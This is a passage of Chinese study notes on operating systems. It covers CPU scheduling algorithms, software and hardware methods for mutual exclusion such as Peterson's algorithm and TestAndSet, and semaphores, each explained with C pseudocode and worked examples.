P4(6))：P2运行结束，虽然时间片没用完，但是会主动放弃处理机，发生调度</p><p>10时刻(P4(6))：P3运行结束，虽然时间片没用完，但是会主动放弃处理机，发生调度</p><p>15时刻()：P4时间片用完，但就绪队列为空，因此会让P4继续执行一个时间片</p><p>16时刻：P4运行完，主动放弃处理机。所有进程运行结束</p><p>如果时间片太大，使得每个进程都可以在一个时间内就完成，则时间片轮转调度算法退化为先来先服务调度算法，并且会增大进程响应时间。所以时间片不能太大。</p><p>另一方面，进程调度、切换是有时间代价的(保存、恢复运行环境)，因此如果时间片太小，会导致进程切换过于频繁，系统会花大量的时间来处理进程切换，从而导致实际用于进程执行的时间比例减少。可见时间片也不能太小。</p><h4 id="2-8-7-5-优先级调度算法"><a href="#2-8-7-5-优先级调度算法" class="headerlink" title="2.8.7.5 优先级调度算法"></a>2.8.7.5 优先级调度算法</h4><p>算法思想：随着计算机的发展，特别是实时操作系统的出现，越来越多的应用场景需要根据任务的紧急程度来决定处理顺序</p><p>算法规则：每个作业/进程有各自的优先级，调度时选择优先级最高的作业/进程</p><p>用于作业 / 进程调度：既可用于作业调度，也可用于进程调度。甚至还会用于I/O调度</p><p>是否可抢占：抢占式、非抢占式都有。非抢占式只需在进程主动放弃处理机时进行调度即可，而抢占式还需在就绪队列变化时，检查是否会发生抢占</p><p>优点：用优先级区别紧急程度、重要程度，适用于实时操作系统。可灵活地调整对各种作业/进程的偏好程度</p><p>缺点：若源源不断地有高优先级进程到来，则可能会导致饥饿</p><p>是否会导致饥饿：会</p><p>例：各进程到达就绪队列的时间、需要的运行时间、进程优先数如下表所示。使用<strong>非抢占式</strong>的优先级调度算法，分析进程运行情况。(注：优先数越大，优先级越高)</p><div class="table-container"><table><thead><tr><th>进程</th><th>到达时间</th><th>运行时间</th><th>优先数</th></tr></thead><tbody><tr><td>P1</td><td>0</td><td>7</td><td>1</td></tr><tr><td>P2</td><td>2</td><td>4</td><td>2</td></tr><tr><td>P3</td><td>4</td><td>1</td><td>3</td></tr><tr><td>P4</td><td>5</td><td>4</td><td>2</td></tr></tbody></table></div><p>非抢占式的优先级调度算法：每次调度时选择当前已到达且优先级最高的进程。当前进程主动放弃处理机时发生调度。</p><p>注：以下括号内表示当前处于就绪队列的进程</p><p>0时刻(P1)：只有P1到达，P1上处理机</p><p>7时刻(P2、P3、P4)：P1运行完成主动放弃处理机，其余进程都已到达，P3优先级最高，P3上处理机</p><p>8时刻(P2、P4)：P3完成，P2、P4优先级相同，由于P2先到达，因此P2优先上处理机</p><p>12时刻(P4)：P2完成，就绪队列只剩P4，P4上处理机</p><p>16时刻()：P4完成，所有进程都结束</p><p>例题同上，采用<strong>抢占式</strong>的优先级调度算法。</p><p>抢占式的优先级调度算法：每次调度时选择当前已到达且优先级最高的进程。当前进程主动放弃处理机时发生调度。另外，当就绪队列发生改变时也需要检查是否会发生抢占。</p><p>注：以下括号内表示当前处于就绪队列的进程</p><p>0时刻(P1(7))：只有P1到达，P1上处理机</p><p>2时刻(P2(4)、P1(5))：P2到达就绪队列，优先级比P1更高，发生抢占。P1回到就绪队列，P2上处理机</p><p>4时刻(P3(1)、P2(2)、P1(5))：P3到达，优先级比P2更高，P2回到就绪队列，P3抢占处理机</p><p>5时刻(P2(2)、P4(4)、P1(5))：P3完成，主动释放处理机，同时P4到达，由于P2比P4更先进入就绪队列，因此选择P2上处理机</p><p>7时刻(P4(4)、P1(5))：P2完成，就绪队列只剩P1和P4，P4上处理机</p><p>11时刻(P1(5))：P4完成，P1上处理机</p><p>16时刻()：P1完成，所有进程结束</p><p><strong>补充</strong>：</p><p>就绪队列未必只有一个，可以按照不同优先级来组织。另外，也可以把优先级高的进程排在更靠近队头的位置。根据优先级是否可以动态改变，可将优先级分为静态优先级和动态优先级两种。</p><ul><li>静态优先级：创建进程时确定，之后一直不变。</li><li>动态优先级：创建进程时有一个初始值，之后会根据情况动态地调整优先级。</li></ul><p>通常，系统进程优先级高于用户进程，前台进程优先级高于后台进程，操作系统更偏好I/O型进程(或称I/O繁忙型进程)。</p><p>与I/O型进程相对的是计算型进程(或称CPU繁忙型进程)。</p><h4 id="2-8-7-6-多级反馈队列调度算法"><a href="#2-8-7-6-多级反馈队列调度算法" class="headerlink" title="2.8.7.6 多级反馈队列调度算法"></a>2.8.7.6 多级反馈队列调度算法</h4><p>算法思想：对其它调度算法的折中权衡</p><p>算法规则：</p><ol><li>设置多级就绪队列，各级队列优先级从高到低，时间片从小到大</li><li>新进程到达时先进入第1级队列，按FCFS原则排队等待被分配时间片，若用完时间片进程还未结束，则进程进入下一级队列队尾。如果此时已经是在最下级的队列，则重新放回该队列队尾</li><li>只有第k级队列为空时，才会为k+1级队头的进程分配时间片</li></ol><p>用于作业 / 进程调度：用于进程调度</p><p>是否可抢占：抢占式算法。在k级队列的进程运行过程中，若更上级的队列(1~k-1级)中进入了一个新进程，则由于新进程处于优先级更高的队列中，因此新进程会抢占处理机，原来运行的进程放回k级队列队尾</p><p>优点：对各类进程相对公平(FCFS优点)；每个新到达的进程都可以很快就得到响应(RR优点)；短进程只用较少的时间就可完成(SPF优点)；不必实现估计进程的运行时间(避免用户作假)；可灵活地调整对各类进程的偏好程度，比如CPU密集型进程、I/O密集型进程(拓展：可以将因I/O而阻塞的进程重新放回原队列，这样I/O型进程就可以保持较高优先级)</p><p>是否会导致饥饿：会</p><p>例：各进程到达就绪队列的时间、需要的运行时间如下表所示。使用多级反馈队列调度算法，分析进程运行的过程。</p><div class="table-container"><table><thead><tr><th>进程</th><th>到达时间</th><th>运行时间</th></tr></thead><tbody><tr><td>P1</td><td>0</td><td>8</td></tr><tr><td>P2</td><td>1</td><td>4</td></tr><tr><td>P3</td><td>5</td><td>1</td></tr></tbody></table></div><p>设置多级就绪队列，各级队列优先级从高到低，时间片从小到大。新进程到达时先进入第1级队列，按FCFS原则排队等待被分配时间片。若用完时间片进程还未结束，则进程进入下一级队列队尾。如果此时已经在最下级的队列，则重新放回最下级队列队尾。只有第k级队列为空时，才会为k+1级队头的进程分配时间片。</p><h2 id="2-9-进程同步与互斥"><a href="#2-9-进程同步与互斥" class="headerlink" title="2.9 进程同步与互斥"></a>2.9 进程同步与互斥</h2><p>进程具有异步性的特征。异步性是指，各并发执行的进程以各自独立的、不可预知的速度向前推进。</p><h3 id="2-9-1-进程同步"><a href="#2-9-1-进程同步" class="headerlink" title="2.9.1 进程同步"></a>2.9.1 进程同步</h3><p>读进程和写进程并发地执行，由于并发必然导致异步性，因此“写数据”和“读数据”两个操作执行的先后顺序是不确定的。而实际应用中，又必须按照“写数据-&gt;读数据”的顺序来执行的。如何解决这种异步问题，就是“进程同步”所讨论的内容。</p><p>同步亦称直接制约关系，它是指为完成某种任务而建立的两个或多个进程，这些进程因为需要在某些位置上协调它们的工作次序而产生的制约关系。进程间的直接制约关系就是源于它们之间的相互合作。</p><h3 id="2-9-2-进程互斥"><a href="#2-9-2-进程互斥" class="headerlink" title="2.9.2 进程互斥"></a>2.9.2 进程互斥</h3><p>进程的“并发”需要“共享”的支持。各个并发执行的进程不可避免地需要共享一些系统资源(比如内存，又比如打印机、摄像头这样的I/O设备)。</p><p>我们把一个时间段内只允许一个进程使用的资源称为临界资源。许多物理设备(比如摄像头、打印机)都属于临界资源。此外还有许多变量、数据、内存缓冲区等都属于临界资源。</p><p>对临界资源的访问，必须互斥地进行。互斥，亦称间接制约关系。进程互斥指当一个进程访问某临界资源时，另一个想要访问该临界资源的进程必须等待。当前访问临界资源的进程访问结束，释放该资源之后，另一个进程才能去访问临界资源。</p><p>对临界资源的互斥访问，可以在逻辑上分为四个部分：</p><ul><li>进入区：负责检查是否可进入临界区，若可进入，则应设置正在访问临界资源的标志(可理解为“上锁”)，以阻止其它进程同时进入临界区</li><li>临界区：访问临界资源的那段代码</li><li>退出区：负责解除正在访问临界资源的标志(可理解为“解锁”)</li><li>剩余区：做其它处理</li></ul><p>为了实现对临界资源的互斥访问，同时保证系统整体性能，需要遵循以下原则：</p><ol><li>空闲让进。临界区空闲时，可以允许一个请求进入临界区的进程立即进入临界区</li><li>忙则等待。当已有进程进入临界区时，其它试图进入临界区的进程必须等待</li><li>有限等待。对请求访问的进程，应保证能在有限时间内进入临界区(保证不会饥饿)</li><li>让权等待。当进程不能进入临界区时，应立即释放处理机，防止进程忙等待</li></ol><h4 id="2-9-2-1-进程互斥的软件实现方法"><a href="#2-9-2-1-进程互斥的软件实现方法" class="headerlink" title="2.9.2.1 进程互斥的软件实现方法"></a>2.9.2.1 进程互斥的软件实现方法</h4><h5 id="2-9-2-1-1-单标志法"><a href="#2-9-2-1-1-单标志法" class="headerlink" title="2.9.2.1.1 单标志法"></a>2.9.2.1.1 单标志法</h5><p>算法思想：两个进程在访问完临界区后会把使用临界区的权限转交给另一个进程。也就是说每个进程进入临界区的权限只能被另一个进程赋予。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> turn = <span class="number">0</span>;<span class="comment">//turn表示当前允许进入临界区的进程号</span></span><br></pre></td></tr></table></figure><p>P0进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (turn != <span class="number">0</span>);①<span class="comment">//进入区</span></span><br><span class="line">critical section;②<span class="comment">//临界区</span></span><br><span class="line">turn = <span class="number">1</span>;③<span class="comment">//退出区</span></span><br><span class="line">remainder section;④<span class="comment">//剩余区</span></span><br></pre></td></tr></table></figure><p>P1进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(turn != <span class="number">1</span>);⑤<span class="comment">//进入区</span></span><br><span class="line">critical section;⑥<span class="comment">//临界区</span></span><br><span class="line">turn = <span class="number">0</span>;⑦<span class="comment">//退出区</span></span><br><span class="line">remainder section;⑧<span class="comment">//剩余区</span></span><br></pre></td></tr></table></figure><p>turn的初值为0，即刚开始只允许0号进程进入临界区，若P1先上处理机运行，则会一直卡在⑤，直到P1的时间片用完，发生调度，切换P0上处理机运行。代码①不会卡住P0，P0可以正常访问临界区，在P0访问临界区期间即时切换回P1，P1依然会卡在⑤。</p><p>因此，该算法可以实现“同一时刻最多只允许一个进程访问临界区”。</p><p>turn表示当前允许进入临界区的进程号，而只有当前允许进入临界区的进程在访问了临界区之后，才会修改turn的值。也就是说，对于临界区的访问，一定是按 P0 -&gt; P1 -&gt; P0 -&gt; P1 -&gt; … 这样轮流访问。这种必须“轮流访问”带来的问题是，如果此时允许进入临界区的进程是P0，而P0一直不访问临界区，那么虽然此时临界区空闲，但是并不允许P1访问。</p><p>因此，单标志法存在的主要问题是：违背“空闲让进”原则。</p><h5 id="2-9-2-1-2-双标志先检查法"><a href="#2-9-2-1-2-双标志先检查法" class="headerlink" title="2.9.2.1.2 双标志先检查法"></a>2.9.2.1.2 双标志先检查法</h5><p>算法思想：设置一个布尔型数组flag[]，数组中各个元素用来标记各进程想进入临界区的意愿，比如<code>flag[0]=true</code>意味着0号进程P0现在想要进入临界区。每个进程在进入临界区之前先检查当前有没有别的进程想进入临界区，如果没有，则把自身对应的标志<code>flag[i]</code>设为true，之后开始访问临界区。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> flag[<span class="number">2</span>];<span class="comment">//表示进入临界区意愿的数组</span></span><br><span class="line">flag[<span class="number">0</span>] = <span class="literal">false</span>;</span><br><span class="line">flag[<span class="number">1</span>] = <span class="literal">false</span>;<span class="comment">//刚开始设置为两个进程都不想进入临界区</span></span><br></pre></td></tr></table></figure><p>P0进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(flag[<span class="number">1</span>]);①</span><br><span class="line">flag[<span class="number">0</span>] = <span class="literal">true</span>;②</span><br><span class="line">critical section;③</span><br><span class="line">flag[<span class="number">0</span>] = <span class="literal">false</span>;④</span><br><span class="line">remainder section;</span><br></pre></td></tr></table></figure><p>P1进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(flag[<span class="number">0</span>]);⑤<span class="comment">//如果此时P0想进入临界区，P1就一直循环等待</span></span><br><span class="line">flag[<span class="number">1</span>] = <span class="literal">true</span>;⑥<span class="comment">//标记为P1进程想要进入临界区</span></span><br><span class="line">critical section;⑦<span class="comment">//访问临界区</span></span><br><span class="line">flag[<span class="number">1</span>] = <span class="literal">false</span>;⑧<span class="comment">//访问完临界区，修改标记为P1不想使用临界区</span></span><br><span class="line">remainder section;</span><br></pre></td></tr></table></figure><p>若按照①⑤②⑥③⑦…的顺序执行，P0和P1将会同时访问临界区。因此，双标志位先检查法的主要问题是：违反“忙则等待”原则。原因在于，进入区的“检查”和“上锁”两个处理不是一气呵成的。“检查”后，“上锁”前可能发生进程切换。</p><h5 id="2-9-2-1-3-双标志后检查法"><a href="#2-9-2-1-3-双标志后检查法" class="headerlink" title="2.9.2.1.3 双标志后检查法"></a>2.9.2.1.3 双标志后检查法</h5><p>算法思想：双标志先检查法的改版。前一个算法的问题是先“检查”后“上锁”，但是这两个操作又无法一气呵成，因此导致了两个进程同时进入临界区的问题。因此，人们又想到先“上锁”后“检查”的方法，来避免上述问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> flag[<span class="number">2</span>];<span class="comment">//表示进入临界区意愿的数组</span></span><br><span class="line">flag[<span class="number">0</span>] = <span class="literal">false</span>;</span><br><span class="line">flag[<span class="number">1</span>] = <span class="literal">false</span>;<span class="comment">//刚开始设置为两个进程都不想进入临界区</span></span><br></pre></td></tr></table></figure><p>P0进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag[<span class="number">0</span>] = <span class="literal">true</span>;①</span><br><span class="line"><span class="keyword">while</span>(flag[<span class="number">1</span>]);②</span><br><span class="line">critical section;③</span><br><span class="line">flag[<span class="number">0</span>] = <span class="literal">false</span>;④</span><br><span class="line">remainder section;</span><br></pre></td></tr></table></figure><p>P1进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag[<span class="number">1</span>] = <span class="literal">true</span>;⑤<span class="comment">//标记为P1进程想要进入临界区</span></span><br><span class="line"><span class="keyword">while</span>(flag[<span class="number">0</span>]);⑥<span class="comment">//如果P0也想进入临界区，则P1循环等待</span></span><br><span class="line">critical section;⑦<span class="comment">//访问临界区</span></span><br><span class="line">flag[<span class="number">1</span>] = <span class="literal">false</span>;⑧<span class="comment">//访问完临界区，修改标记为P1不想使用临界区</span></span><br><span class="line">remainder section;</span><br></pre></td></tr></table></figure><p>若按照①⑤②⑥…的顺序执行，P0和P1都将无法进入临界区。因此，双标志后检查法虽然解决了“忙则等待”的问题，但是又违背了“空闲让进”和“有限等待”原则，会因各进程都长期无法访问临界资源而产生“饥饿”现象。</p><h5 id="2-9-2-1-4-Peterson算法"><a href="#2-9-2-1-4-Peterson算法" class="headerlink" title="2.9.2.1.4 Peterson算法"></a>2.9.2.1.4 Peterson算法</h5><p>算法思想：双标志后检查法中，两个进程都争着想进入临界区，但是谁也不让谁，最后谁都无法进入临界区。Gary L·Perterson想到了一种方法，如果双方都争着想进入临界区，那可以让进程尝试“孔融让梨”，主动让对方先使用临界区。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> flag[<span class="number">2</span>];<span class="comment">//表示进入临界区意愿的数组，初始值都是false</span></span><br><span class="line"><span class="type">int</span> turn = <span class="number">0</span>;<span class="comment">//turn表示优先让哪个进程进入临界区</span></span><br></pre></td></tr></table></figure><p>P0进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag[<span class="number">0</span>] = <span class="literal">true</span>;①</span><br><span class="line">turn = <span class="number">1</span>;②</span><br><span class="line"><span class="keyword">while</span>(flag[<span class="number">1</span>] &amp;&amp; turn == <span class="number">1</span>);③</span><br><span class="line">critical section;④</span><br><span class="line">flag[<span class="number">0</span>] = <span class="literal">false</span>;⑤</span><br><span class="line">remainder section;</span><br></pre></td></tr></table></figure><p>P1进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag[<span class="number">1</span>] = <span class="literal">true</span>;⑥<span class="comment">//表示自己想进入临界区</span></span><br><span class="line">turn = <span class="number">0</span>;⑦<span class="comment">//可以优先让对方进入临界区</span></span><br><span class="line"><span class="keyword">while</span>(flag[<span class="number">0</span>] &amp;&amp; turn == <span class="number">0</span>);⑧<span class="comment">//对方想进，且最后一次是自己“让梨”，那自己就循环等待</span></span><br><span class="line">critical section;⑨</span><br><span class="line">flag[<span class="number">1</span>] = <span class="literal">false</span>;⑩<span class="comment">//访问完临界区，表示自己已经不想访问临界区了</span></span><br><span class="line">remainder section;</span><br></pre></td></tr></table></figure><p>两种双标志法的问题都是由于进入区的几个操作不能一气呵成导致的。我们可以推理验证在Peterson算法中，两个进程进入区中的各个操作按不同的顺序穿插执行会发生什么情况：①⑥②③⑦⑧③④⑤…</p><p>Peterson算法用软件方法解决了进程互斥问题，遵循了空闲让进、忙则等待、有限等待三个原则，但是依然未遵循让权等待的原则。</p><h4 id="2-9-2-2-进程互斥的硬件实现方法"><a href="#2-9-2-2-进程互斥的硬件实现方法" class="headerlink" title="2.9.2.2 进程互斥的硬件实现方法"></a>2.9.2.2 进程互斥的硬件实现方法</h4><h5 id="2-9-2-2-1-中断屏蔽方法"><a href="#2-9-2-2-1-中断屏蔽方法" class="headerlink" title="2.9.2.2.1 中断屏蔽方法"></a>2.9.2.2.1 中断屏蔽方法</h5><p>利用“开/关中断指令”实现(与原语的实现思想相同，即在某进程开始访问临界区到结束访问为止都不允许被中断，也就不能发生进程切换，因此也不可能发生两个同时访问临界区的情况)。</p><p>将临界区放在关/开中断之间，关中断后即不允许当前进程被中断，也必然不会发生进程切换，直到当前进程访问完临界区，再执行开中断指令，才有可能有别的进程上处理机并访问临界区。</p><p>优点：简单、高效</p><p>缺点：不适用于多处理机，只适用于操作系统内核进程，不适用于用户进程(因为关/开中断指令只能运行在内核态，这组指令如果能让用户随意使用会很危险)。</p><h5 id="2-9-2-2-2-TestandSet指令"><a href="#2-9-2-2-2-TestandSet指令" class="headerlink" title="2.9.2.2.2 TestandSet指令"></a>2.9.2.2.2 TestandSet指令</h5><p>简称TS指令，也有地方称TestandSetLock指令，或TSL指令。</p><p>TSL指令是用硬件实现的，执行的过程不允许被中断，只能一气呵成。以下是用C语言描述的逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 布尔型共享变量 lock 表示当前临界区是否被加锁</span></span><br><span class="line"><span class="comment">// true表示已加锁，false表示未加锁</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">TestAndSet</span><span class="params">(<span class="type">bool</span> *lock)</span>{</span><br><span class="line">    <span class="type">bool</span> old;</span><br><span class="line">    old = *lock;    <span class="comment">//old用来存放lock，原来的值</span></span><br><span class="line">    *lock = <span class="literal">true</span>;   <span class="comment">//无论之前是否已加锁，都将lock设为true</span></span><br><span class="line">    <span class="keyword">return</span> old;     <span class="comment">//返回lock原来的值</span></span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 以下是使用 TSL 指令实现互斥的算法逻辑</span></span><br><span class="line"><span class="keyword">while</span>(TestAndSet(&amp;lock)); <span class="comment">//"上锁"并"检查"</span></span><br><span class="line"><span class="comment">//临界区代码段...</span></span><br><span class="line">lock = <span class="literal">false</span>;       <span class="comment">//"解锁"</span></span><br><span class="line"><span class="comment">//剩余区代码段...</span></span><br></pre></td></tr></table></figure><p>若刚开始lock是false，则TSL返回的old值为false，while循环条件不满足，直接跳过循环，进入临界区。若刚开始 lock 是 true，则执行TSL后old返回值为true，while循环条件满足，会一直循环，直到当前访问临界区的进程在退出区进行“解锁”。</p><p>相比于软件实现方法，TSL指令把“上锁”和“检查”操作用硬件的方式变成了一气呵成的原子操作。</p><p>优点：实现简单，无需像软件实现方法那样严格检查是否有逻辑漏洞；适用于多处理机环境。</p><p>缺点：不满足“让权等待”原则，暂时无法进入临界区的进程会占用CPU并循环执行TSL指令，从而导致“忙等”。</p><h5 id="2-9-2-2-3-Swap指令"><a href="#2-9-2-2-3-Swap指令" class="headerlink" title="2.9.2.2.3 Swap指令"></a>2.9.2.2.3 Swap指令</h5><p>有的地方也叫Exchange指令，或简称XCHG指令。</p><p>Swap指令也是用硬件实现的，执行过程不允许中断，只能一气呵成。以下是用C语言描述的逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Swap指令的作业是交换两个变量的值</span></span><br><span class="line">Swap(<span class="type">bool</span> *a, <span class="type">bool</span> *b){</span><br><span class="line">    <span class="type">bool</span> temp;</span><br><span class="line">    temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 以下是用Swap指令实现互斥的逻辑算法</span></span><br><span class="line"><span class="comment">// lock表示当前临界区是否被加锁</span></span><br><span class="line"><span class="type">bool</span> old = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">while</span>(old == <span class="literal">true</span>)</span><br><span class="line">    Swap(&amp;lock, &amp;old);</span><br><span class="line"><span class="comment">//临界区代码段...</span></span><br><span class="line">lock = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//剩余区代码段...</span></span><br></pre></td></tr></table></figure><p>逻辑上来看Swap和TSL并无太大区别，都是先记录下此时临界区是否已经被上锁(记录在old变量上)，再将上锁标记lock设置为true，最后检查old，如果old为false则说明之前没有别的进程对临界区上锁，则可跳出循环，进入临界区。</p><p>优点：实现简单，无需像软件实现方法那样严格检查是否会有逻辑漏洞；适用于多处理机环境。</p><p>缺点：不满足“让权等待”原则，暂时无法进入临界区的进程会占用CPU并循环执行TSL指令，从而导致“忙等”。</p><h2 id="2-10-信号量机制"><a href="#2-10-信号量机制" class="headerlink" title="2.10 信号量机制"></a>2.10 信号量机制</h2><p>用户进程可以通过使用操作系统提供的一对原语来对信号量进行操作，从而很方便地实现了进程互斥、进程同步。</p><p>信号量其实就是一个变量(可以是一个整数，也可以是更复杂的记录型变量)，可以用一个信号量来表示系统中某种资源的数量，比如：系统中只有一台打印机，就可以设置一个初值为1的信号量。</p><p>原语是一种特殊的程序段，其执行只能一气呵成，不可被中断。原语是由关中断/开中断指令实现的。软件解决方案的主要问题是由“进入区的各种操作无法一气呵成”，因此如果能把进入区、退出区的操作都用原语实现，使这些操作能“一气呵成”就能避免问题。</p><p>一对原语：wait(S)原语和signal(S)原语，可以把原语理解为我们自己写的函数，函数名分别为wait和signal，括号里的信号量S其实就是函数调用时传入的一个参数。</p><p>wait、signal原语常简称为P、V操作，因此通常把wait(S)、signal(S)两个操作分别写为P(S)、V(S)。</p><h3 id="2-10-1-整型信号量"><a href="#2-10-1-整型信号量" class="headerlink" title="2.10.1 整型信号量"></a>2.10.1 整型信号量</h3><p>用一个整数型的变量作为信号量，用来表示系统中某种资源的数量。</p><p>与普通整型变量的区别：对信号量的操作只有三种，即初始化、P操作、V操作。</p><p>比如某计算机系统中有一台打印机：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> S = <span class="number">1</span>;<span class="comment">//初始化整型信号量S，表示当前系统中可用的打印机资源数</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">wiat</span><span class="params">(<span class="type">int</span> S)</span><span class="comment">//wait原语，相当于“进入区”</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">while</span>(S &lt;= <span class="number">0</span>);<span class="comment">//如果资源数不够，就一直循环等待</span></span><br><span class="line">    S = S - <span class="number">1</span>;<span class="comment">//如果资源数够，则占用一个资源</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal</span><span class="params">(<span class="type">int</span> S)</span><span class="comment">//signal原语，相当于“退出区”</span></span><br><span class="line">{</span><br><span class="line">    S = S + <span class="number">1</span>;<span class="comment">//使用完资源后，在退出区释放资源</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">进程P0：</span><br><span class="line">...</span><br><span class="line">wait(S);<span class="comment">//进入区，申请资源</span></span><br><span class="line">使用打印机资源...<span class="comment">//临界区，访问资源</span></span><br><span class="line">signal(S);<span class="comment">//退出区，释放资源</span></span><br></pre></td></tr></table></figure><p>“检查”和“上锁”一气呵成，避免了并发、异步导致的问题。</p><p>存在的问题：不满足“让权等待”原则，会发生“忙等”。</p><h3 id="2-10-2-记录型信号量"><a href="#2-10-2-记录型信号量" class="headerlink" title="2.10.2 记录型信号量"></a>2.10.2 记录型信号量</h3><p>整型信号量的缺陷是存在“忙等”问题，因此人们又提出了“记录型信号量”，即用记录型数据结构表示的信号量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*记录型信号量的定义*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">int</span> value;<span class="comment">//剩余资源数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">process</span> *<span class="title">L</span>;</span><span class="comment">//等待队列</span></span><br><span class="line">}semaphore;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*某进程需要使用资源时，通过wait原语申请*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">wait</span><span class="params">(semaphore S)</span></span><br><span class="line">{</span><br><span class="line">    S.value--;</span><br><span class="line">    <span class="keyword">if</span>(S.value &lt; <span class="number">0</span>)</span><br><span class="line">        block(S.L);</span><br><span class="line">}</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">如果剩余资源数不够，使用block原语使进程从运行态进入阻塞态，并把挂到信号量S的等待队列(即阻塞队列)中。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*进程使用完资源后，通过signal原语释放*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal</span><span class="params">(semaphore S)</span></span><br><span class="line">{</span><br><span class="line">    S.value++;</span><br><span class="line">    <span class="keyword">if</span>(S.value &lt;= <span class="number">0</span>)</span><br><span class="line">        wakeup(S.L);</span><br><span class="line">}</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">释放资源后，若还有别的进程在等待这种资源，则使用wakeup原语唤醒等待队列中的一个进程，该进程从阻塞态变为就绪态</span></span><br><span class="line"><span 